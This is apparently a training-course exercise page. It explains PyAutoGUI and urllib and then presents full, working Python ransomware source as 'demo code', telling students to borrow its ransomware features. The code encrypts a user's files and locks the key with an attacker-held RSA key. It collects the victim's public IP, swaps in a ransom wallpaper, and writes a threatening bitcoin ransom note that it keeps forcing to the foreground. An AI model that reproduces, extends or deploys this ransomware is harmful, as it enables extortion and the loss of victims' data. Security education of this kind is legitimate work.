# Ops Challenge - File Encryption Script Part 3 of 3

## PyAutoGUI

**PyAutoGUI** is a Python module which can automate your GUI and programmatically control your keyboard and mouse. PyAutoGUI does not come with Python, so first you have to install it: `pip install PyAutoGUI`

`alert()`: Displays a simple message box with text and a single OK button. Returns the text of the button clicked on.

```python
import pyautogui

# Will display the alert box with the given text and when clicked OK it will return 'OK'
pyautogui.alert('Alert Box')
```

`confirm()`: Displays a message box with OK and Cancel buttons. Number and text of buttons can be customized. Returns the text of the button clicked on.

```python
import pyautogui

pyautogui.confirm('Do you want to continue?')
```

**To have multiple select options**

```python
# Python program to show confirm() function with multiple options
import pyautogui

pyautogui.confirm('Enter option Gfg', buttons = ['A', 'B', 'C'])
```

`prompt()`: Displays a message box with text input, and OK & Cancel buttons. Returns the text entered, or None if Cancel was clicked.

```python
# Python Program to show prompt() function
import pyautogui

pyautogui.prompt('What is your name?')
```

`password()`: Displays a message box with text input, and OK & Cancel buttons. Typed characters appear as *. Returns the text entered, or None if Cancel was clicked.

```python
# Python Program to show password() function
import pyautogui

pyautogui.password('Enter password (text will be hidden)')
```

## Urllib Module

Urllib package is the URL handling module for python. It is used to fetch URLs. It uses the *urlopen* function and is able to fetch URLs using a variety of different protocols

Urllib is a package that collects several modules for working with URLs, such as:

- urllib.request for opening and reading
- urllib.parse for parsing URLs
- urllib.error for the exceptions raised
- urllib.robotparser for parsing robot.txt files

If urllib is not present, install it using `pip install urllib`

**urllib.request Example**

```python
# Example that opens an URL
import urllib.request

request_url = urllib.request.urlopen('https://www.codefellows.org')
print(request_url.read())
```

**urllib.parse Example**

- This module helps us define functions to manipulate URLs and their component parts, to build or break them. Focuses on splitting a URL into small components or joining different URL components into URL strings.

```python
from urllib.parse import * parse_url = urlparse('https://www.geeksforgeeks.org/python-langtons-ant/')
print(parse_url)
print("\n")
unparse_url = urlunparse(parse_url)
print(unparse_url)
```

**urllib.error**

- This module defines the classes for exception raised by urllib.request. Whenever there is an error in fetching a URL, this module helps in raising exceptions. The following are exceptions raised:
- URLError: raised for the errors in URLs, or errors while fetching the URL due to connectivity
- HTTPError: raised for the exotic HTTP errors, such as the authentication request errors. It is a subclass or URLError.

```python
# URL Error

import urllib.request
import urllib.parse

# trying to read the URL but with no internet connectivity
try:
  x = urllib.request.urlopen('https://www.google.com')
  print(x.read())

# Catching the exception generated
except Exception as e :
  print(str(e))
```

```python
# HTTP Error

import urllib.request
import urllib.parse

# trying to read the URL
try:
 x = urllib.request.urlopen('https://www.google.com/search?q = test')
 print(x.read())

# Catching the exception generated
except Exception as e :
 print(str(e))
```

**urllib.robotparser**

- This module contains a single class, RobotFileParser. This class answers question about whether or not a particular URL that published robot.txt files. This file tells the web scraper about what parts of the server should not be accessed.

```python
# importing robot parser class
import urllib.robotparser as rb

bot = rb.RobotFileParser()

# checks where the website's robot.txt file reside
x = bot.set_url('https://www.geeksforgeeks.org/robots.txt')
print(x)

# reads the files
y = bot.read()
print(y)

# we can crawl the main site
z = bot.can_fetch('*', 'https://www.geeksforgeeks.org/')
print(z)

# but can not crawl the disallowed url
w = bot.can_fetch('*', 'https://www.geeksforgeeks.org/wp-admin/')
print(w)
```

## Demo Code

This demo code is from an example piece of ransomware code written in Python from https://github.com/ncorbuk/Python-Ransomware/blob/master/RansomWare.py

Use this code as a reference point to add useful ransomware behavior features to your file encryption script.

```python

# Imports
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
import os # to get system root
import webbrowser # to load web browser to go to specific website eg bitcoin
import ctypes # so we can interact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get request to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom  note
import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # used for ransom note and decryption key on desktop



class RansomWare:


    # File extensions to seek out and Encrypt
    file_exts = [
        'txt',
       # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
       # -and leaves other files un-encrypted etc.
       # 'png',

    ]


    def __init__(self):
        # Key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

        ''' Root directories to start Encryption/Decryption from
            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
        '''
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser('~')
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' # Debugging/Testing

        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
        self.publicIP = requests.get('https://api.ipify.org').text


    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        self.key =  Fernet.generate_key()
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)


    # Write the fernet(symmetric key) to text file
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)


    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYMMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # Public RSA key
            self.public_key = RSA.import_key(open('public.pem').read())
            # Public encrypter object
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(enc_fernent_key)
        # Write encrypted fernet key to desktop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypter.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('> File encrpyted')
                print(_data)
            else:
                # Decrypt data from file
                _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    @staticmethod
    def what_is_bitcion():
        url = 'https://bitcoin.org'
        # Open browser to the https://bitcoin.org so they know what bitcoin is
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # Go to specif url and download+save image using absolute path
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
The hard disks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!
To purchase your key and restore your data, please follow these three easy steps:
1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
2. You will receive your personal BTC address for payment.
   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
   We will check to see if payment has been paid.
3. You will receive a text file with your KEY that will unlock all your files.
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
WARNING:
Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.
Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
''')


    def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') # Debugging/Testing
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                # Kill ransom note so we can open it again and make sure ransom note is in ForeGround (top of all windows)
                time.sleep(0.1)
                ransom.kill()
                # Open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # sleep for 10 seconds
            time.sleep(10)
            count +=1
            if count == 5:
                break


    # Decrypts system when text file with un-encrypted key in it is placed on desktop of target machine
    def put_me_on_desktop(self):
        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
        # -the files
        print('started') # Debugging/Testing
        while True:
            try:
                print('trying') # Debugging/Testing
                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
                # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASYMMETRIC KEY etc.
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # Decrpyt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('decrypted') # Debugging/Testing
                    break
            except Exception as e:
                print(e) # Debugging/Testing
                pass
            time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
            print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
            # Would use below code in real life etc... above 10secs is just to "show" concept
            # Sleep ~ 3 mins
            # secs = 60
            # mins = 3
            # time.sleep((mins*secs))



def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcion()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
    print('> RansomWare: Completed') # Debugging/Testing



if __name__ == '__main__':
    main()
```
